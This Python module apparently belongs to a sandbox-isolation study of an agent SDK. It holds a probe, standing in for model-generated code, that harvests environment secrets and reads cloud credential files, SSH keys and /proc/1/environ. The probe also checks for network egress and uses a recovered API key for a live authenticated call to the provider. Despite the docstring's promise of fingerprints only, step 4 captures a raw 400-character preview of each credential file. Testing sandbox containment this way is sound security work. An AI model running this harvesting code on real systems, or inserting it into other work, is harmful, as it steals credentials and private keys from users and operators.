"""The exfiltration probe that runs INSIDE the compute plane.

This is deliberately written as a self-contained shell/python payload so that it is
byte-identical across both sandbox providers. It stands in for "model-generated code",
because the whole question is what such code can reach.

It reports secrets by SHA-256 fingerprint, never by value, except for DECOY_* variables
which are fake and safe to quote verbatim in a committed artifact.
"""

from __future__ import annotations

PROBE_SOURCE = r'''
import hashlib, json, os, pathlib, socket, subprocess, sys

def fp(v):
    return "sha256:" + hashlib.sha256(v.encode()).hexdigest()[:16]

report = {}

# 1. Full environment: which variable names exist in this execution context.
env_names = sorted(os.environ.keys())
report["env_var_names"] = env_names
report["env_var_count"] = len(env_names)

# 2. Secret-looking env vars, fingerprinted (never printed raw).
interesting = {}
for k, v in os.environ.items():
    if any(t in k.upper() for t in ("KEY", "TOKEN", "SECRET", "PASSWORD", "CRED", "AWS")):
        interesting[k] = {"fingerprint": fp(v), "length": len(v)}
report["credential_env_vars"] = interesting

# 3. Decoys quoted verbatim (safe: fake values).
report["decoys_recovered"] = {
    k: v for k, v in os.environ.items() if k.startswith("DECOY_")
}

# 4. Cloud credential files on disk.
files = {}
for p in ("~/.aws/credentials", "~/.config/gcloud/credentials.db", "~/.netrc", "~/.ssh/id_rsa"):
    path = pathlib.Path(os.path.expanduser(p))
    try:
        if path.exists():
            data = path.read_text(errors="replace")
            files[p] = {"exists": True, "bytes": len(data), "fingerprint": fp(data),
                        "preview": data[:400]}
        else:
            files[p] = {"exists": False}
    except Exception as e:
        files[p] = {"exists": None, "error": str(e)}
report["credential_files"] = files

# 5. PID 1 environment: the classic container escape-hatch read.
try:
    raw = pathlib.Path("/proc/1/environ").read_bytes().decode(errors="replace")
    pid1 = [x.split("=", 1)[0] for x in raw.split("\x00") if "=" in x]
    report["proc1_environ"] = {"readable": True, "var_names": sorted(pid1),
                               "var_count": len(pid1)}
except Exception as e:
    report["proc1_environ"] = {"readable": False, "error": str(e)}

# 6. Can the probe see the harness source tree (the control plane's own code)?
host_paths = {}
for p in ("/home/user/builds/openai-agents-sdk-v2-durable-sandbox/experiments/common.py",
          "/home/user/builds/openai-agents-sdk-v2-durable-sandbox", "/home/user"):
    path = pathlib.Path(p)
    try:
        host_paths[p] = {"exists": path.exists(), "is_dir": path.is_dir() if path.exists() else None}
    except Exception as e:
        host_paths[p] = {"exists": None, "error": str(e)}
report["harness_filesystem_visible"] = host_paths

# 7. Outbound network reachability (separate question from credential access).
try:
    s = socket.create_connection(("generativelanguage.googleapis.com", 443), timeout=8)
    s.close()
    report["network_egress"] = {"reachable": True}
except Exception as e:
    report["network_egress"] = {"reachable": False, "error": str(e)}

# 8. THE ACTUAL EXFILTRATION: use a recovered key to make a real authenticated API
#    call. This is what distinguishes "a string was visible" from "an attacker now
#    holds a working credential".
#
#    Target is the provider account endpoint rather than a completion: it is
#    authenticated (so it proves the credential is live), it returns real account
#    data (so it proves impact), and it consumes zero tokens.
key = os.environ.get("MOONSHOT_API_KEY")
if not key:
    report["live_exfiltration"] = {"attempted": False,
                                   "reason": "no MOONSHOT_API_KEY present in this context"}
else:
    try:
        import urllib.request, urllib.error
        req = urllib.request.Request(
            "https://api.moonshot.ai/v1/users/me/balance",
            headers={"Authorization": "Bearer " + key})
        with urllib.request.urlopen(req, timeout=30) as r:
            status = r.status
            payload = json.loads(r.read().decode())
        # Confirm the response really is authenticated account data, without
        # committing the account's actual figures to a public artifact.
        got_account_data = bool(payload.get("status")) and "data" in payload
        report["live_exfiltration"] = {
            "attempted": True, "succeeded": status == 200 and got_account_data,
            "http_status": status,
            "stolen_key_fingerprint": fp(key),
            "endpoint": "api.moonshot.ai/v1/users/me/balance",
            "returned_account_data": got_account_data,
            "note": "Authenticated call to the model provider's account endpoint, made from "
                    "inside the compute plane with a credential that leaked from the "
                    "harness. Account figures withheld from this artifact.",
        }
    except Exception as e:
        code = getattr(e, "code", None)
        report["live_exfiltration"] = {"attempted": True, "succeeded": False,
                                       "http_status": code, "error": str(e)[:200]}

print("<<<PROBE_JSON>>>" + json.dumps(report) + "<<<END_PROBE_JSON>>>")
'''
